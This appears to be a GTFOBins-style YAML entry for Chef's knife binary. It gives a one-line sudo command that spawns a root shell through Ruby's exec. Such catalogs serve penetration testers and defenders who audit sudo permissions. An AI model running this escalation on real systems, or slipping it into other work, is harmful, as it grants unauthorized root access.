---
functions:
  sudo:
    - description: Running /bin/sh via Ruby's exec function.
    - code: |
        sudo /usr/bin/knife exec -E 'exec "/bin/sh"'

---